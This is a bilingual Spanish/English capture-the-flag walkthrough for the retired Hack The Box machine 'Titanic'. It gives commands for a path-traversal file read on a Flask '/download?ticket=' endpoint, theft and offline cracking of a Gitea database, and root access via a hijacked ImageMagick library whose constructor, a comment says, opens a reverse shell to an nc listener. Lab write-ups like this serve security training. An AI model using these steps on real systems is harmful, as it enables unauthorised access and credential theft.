# Titanic [Easy]

> **ES:** Máquina Linux con app Flask de reservas y Gitea interno; se abusa un LFI para filtrar credenciales y un cron de ImageMagick para escalar a root.
> **EN:** Linux box with a Flask booking app and internal Gitea; LFI leaks credentials and an ImageMagick cron job leads to root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Titanic] |
| **URL** | https://app.hackthebox.com/machines/Titanic |
| **IP lab** | 10.10.11.55 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía LFI (`download?ticket=`) → robo de `gitea.db` → SSH como `developer` → abuso de cron `identify_images.sh` (ImageMagick CVE-2024-41817).
> **EN:** Get `user.txt` and `root.txt` via LFI (`download?ticket=`) → `gitea.db` theft → SSH as `developer` → `identify_images.sh` cron abuse (ImageMagick CVE-2024-41817).

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] curl / httpie
- [ ] sqlite3 + gitea2hashcat.py + hashcat/john
- [ ] ssh
- [ ] pspy64 + gcc (privesc ImageMagick)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Solo 22/SSH y 80/HTTP (Apache + Flask/Werkzeug). El vhost es `titanic.htb`; añadir a `/etc/hosts`.
> **EN:** Only 22/SSH and 80/HTTP (Apache + Flask/Werkzeug). Vhost is `titanic.htb`; add to `/etc/hosts`.

```bash
nmap -sC -sV -oN nmap_init 10.10.11.55
echo '10.10.11.55 titanic.htb' | sudo tee -a /etc/hosts
curl -s http://titanic.htb/ | head -40
```

**Resultado / Result:** 22/tcp (ssh), 80/tcp (Apache 2.4.52 → Flask). Dominio `titanic.htb`, app de reserva de camarotes.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El formulario de reserva guarda tickets JSON y el endpoint `/download?ticket=` no sanea `../`. Se prueba lectura de `/etc/hostname` y luego `app.py`.
> **EN:** Booking form stores JSON tickets and `/download?ticket=` does not sanitize `../`. Test with `/etc/hostname`, then read `app.py`.

```bash
# PoC LFI (parafraseado de la nota original)
curl -s 'http://titanic.htb/download?ticket=../../../../../../etc/hostname'
curl -s 'http://titanic.htb/download?ticket=../app.py' -o app.py
grep -n 'TICKETS_DIR\|download\|gitea\|MYSQL' app.py
```

**Resultado / Result:** LFI confirmado (devuelve `titanic`). El código revela `TICKETS_DIR=tickets`, Flask y credencial MySQL de ejemplo; las notas en `img/` (ej. `image_20250323-152319.png`) muestran el flujo de reserva.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Con el LFI se descarga la base de Gitea (`/home/developer/gitea/data/gitea/gitea.db`), se extrae el hash del usuario y se crackea para entrar por SSH.
> **EN:** Use LFI to download the Gitea DB (`/home/developer/gitea/data/gitea/gitea.db`), extract the user hash and crack it for SSH.

```bash
curl -s 'http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db' -o gitea.db
sqlite3 gitea.db "SELECT name, passwd FROM user;"
python3 gitea2hashcat.py gitea.db > hashes.txt
hashcat -m <modo-gitea> hashes.txt /usr/share/wordlists/rockyou.txt
ssh developer@titanic.htb
```

**Resultado / Result:** Hash crackeado → shell como `developer`. Se lee `user.txt` en su home (flag omitida por norma).

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** La sesión SSH como `developer` ya da el flag de usuario. Se verifica `id` y se estabiliza la shell.
> **EN:** The `developer` SSH session already yields the user flag. Verify `id` and stabilize the shell.

```bash
id; ls -l ~/user.txt
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `linpeas` no muestra nada útil, pero `pspy` revela un cron que ejecuta `/opt/scripts/identify_images.sh` (`magick identify` sobre `*.jpg`). Se planta una `libxcb.so.1` maliciosa (CVE-2024-41817, hijack de librería) y el cron la carga como root.
> **EN:** `linpeas` shows nothing, but `pspy` reveals a cron running `/opt/scripts/identify_images.sh` (`magick identify` over `*.jpg`). Drop a malicious `libxcb.so.1` (CVE-2024-41817 library hijack); cron loads it as root.

```bash
cat /opt/scripts/identify_images.sh
./pspy64 -f=true
cd /opt/app/static/assets/images/
gcc -x c -shared -fPIC -o ./libxcb.so.1 libxcb_evil.c
# libxcb_evil.c: constructor que ejecuta reverse shell
nc -lvnp 8888
# esperar callback como root; luego:
whoami  # root
cat /root/root.txt
```

**Resultado / Result:** Callback como `root` vía ImageMagick. Técnica: cron inseguro + hijack de librería compartida.

---

## 🧠 Lo aprendido / Learned

> **ES:** LFI por concatenación de rutas en Flask; exfiltración de `gitea.db` y crack offline; privesc con cron + ImageMagick (CVE-2024-41817).
> **EN:** Path-concatenation LFI in Flask; `gitea.db` exfiltration and offline cracking; cron + ImageMagick privesc (CVE-2024-41817).

- [ ] Auditar `send_file`/`ticket` sin normalizar ruta
- [ ] Gitea sqlite → hash → SSH reuse
- [ ] `pspy` para descubrir crons invisibles

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** HTB Titanic — 0xdf (https://0xdf.gitlab.io/2025/06/21/htb-titanic.html) — 0xdf
- **Walkthrough de referencia:** HTB Titanic Walkthrough — Gokul Karthik (https://infosecwriteups.com/htb-titanic-walkthrough-3557be1fb2a4)
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Contenido migrado y parafraseado desde `Soluciones/Machines/unclasified/Titanic/index.md` (notas CN/EN sin normalizar con capturas en `img/`); flags originales omitidas.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
